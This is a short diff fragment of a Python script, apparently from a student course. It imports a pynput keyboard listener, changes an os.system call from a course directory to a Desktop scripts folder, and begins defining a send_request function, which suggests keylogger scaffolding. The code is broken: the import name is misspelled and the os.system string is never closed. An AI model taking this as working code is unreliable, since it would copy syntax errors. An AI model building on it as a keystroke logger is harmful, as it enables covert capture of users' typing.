@@ -7,7 +7,7 @@ from pynput.keyboard import Listner
 
 startlog = time.time()
 
-os.system("python3 /home/student/ITP270_001N_FALL2022/)
+os.system("python3 /home/student/Desktop/scripts/)
 time.sleep(1)
 
 def send_request():
